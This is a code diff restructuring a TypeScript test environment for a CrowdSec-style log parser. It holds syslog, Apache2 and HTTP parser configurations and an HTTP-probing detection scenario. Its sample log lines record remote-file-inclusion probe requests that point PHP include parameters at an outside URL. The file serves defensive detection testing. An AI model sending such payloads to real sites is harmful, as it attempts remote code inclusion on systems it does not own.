@@ -1,11 +1,25 @@
-export interface TestEnvFile {
+export interface EnvFile {
   name: string
   text: string
 }
 
-export const S00_PARSER: TestEnvFile = {
-  name: 's00-syslog-logs.yaml',
-  text: String.raw`filter: "evt.Line.Labels.type == 'syslog'"
+export interface LpEnv {
+  name: string
+  parserS00Files: EnvFile[]
+  parserS01Files: EnvFile[]
+  parserS02Files: EnvFile[]
+  scenarioFiles:  EnvFile[]
+  logsText:       string
+  defaultLogType: string
+}
+
+export const ENVS_COLLECTION: LpEnv[] = [
+  {
+    name: 'test',
+    parserS00Files: [
+      {
+        name: 'syslog-logs.yaml',
+        text: String.raw`filter: "evt.Line.Labels.type == 'syslog'"
 onsuccess: next_stage
 pattern_syntax:
   RAW_SYSLOG_PREFIX: '^<%{NUMBER:syslog_priority}>%{NUMBER:syslog_version} %{SYSLOGBASE2} %{DATA:program} (?:%{NUMBER:pid}|-)'
@@ -44,11 +58,12 @@ statics:
     expression: evt.Line.Src
   - meta: datasource_type
     expression: evt.Line.Module`,
-}
-
-export const S01_PARSER: TestEnvFile = {
-  name: 's01-apache2-logs.yaml',
-  text: String.raw`filter: "evt.Parsed.program startsWith 'apache2'"
+      },
+    ],
+    parserS01Files: [
+      {
+        name: 'apache2-logs.yaml',
+        text: String.raw`filter: "evt.Parsed.program startsWith 'apache2'"
 onsuccess: next_stage
 name: crowdsecurity/apache2-logs
 description: "Parse Apache2 access and error logs"
@@ -76,11 +91,12 @@ nodes:
         - meta: target_fqdn
           expression: "evt.Parsed.target_fqdn"
     onsuccess: next_stage`,
-}
-
-export const S02_PARSER: TestEnvFile = {
-  name: 's02-http-logs.yaml',
-  text: String.raw`filter: "evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']"
+      },
+    ],
+    parserS02Files: [
+      {
+        name: 'http-logs.yaml',
+        text: String.raw`filter: "evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']"
 description: "Parse more Specifically HTTP logs, such as HTTP Code, HTTP path, HTTP args and if its a static ressource"
 name: crowdsecurity/http-logs
 pattern_syntax:
@@ -108,14 +124,12 @@ nodes:
           expression: evt.Parsed.file_frag + evt.Parsed.file_ext
         - parsed: static_ressource
           expression: "Upper(evt.Parsed.file_ext) in ['.JPG', '.CSS', '.JS', '.JPEG', '.PNG', '.SVG', '.MAP', '.ICO', '.OTF', '.GIF', '.MP3', '.MP4', '.WOFF', '.WOFF2', '.TTF', '.OTF', '.EOT', '.WEBP', '.WAV', '.GZ', '.BROTLI', '.BVR', '.TS', '.BMP', '.AVIF', '.MJS'] ? 'true' : 'false'"`,
-}
-
-export const TEST_ENV = {
-  parserFiles: [S00_PARSER, S01_PARSER, S02_PARSER] as TestEnvFile[],
-  scenarioFiles: [
-    {
-      name: 'http-probing.yaml',
-      text: String.raw`type: leaky
+      },
+    ],
+    scenarioFiles: [
+      {
+        name: 'http-probing.yaml',
+        text: String.raw`type: leaky
 name: crowdsecurity/http-probing
 description: "Detect site scanning/probing from a single ip"
 filter: "evt.Meta.service == 'http' && evt.Meta.http_status in ['404', '403', '400'] && evt.Parsed.static_ressource == 'false'"
@@ -134,9 +148,9 @@ labels:
   spoofable: 0
   service: http
   confidence: 1`,
-    },
-  ] as TestEnvFile[],
-  logsText: String.raw`172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
+      },
+    ],
+    logsText: String.raw`172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
 172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /starnet/themes/c-sky/main.inc.php?cmsdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
 172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /start.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
 172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /start.php?pg=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
@@ -148,5 +162,6 @@ labels:
 172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpform.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
 172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /str.php?p=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
 172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196`,
-  defaultLogType: 'apache2',
-}
+    defaultLogType: 'apache2',
+  },
+]
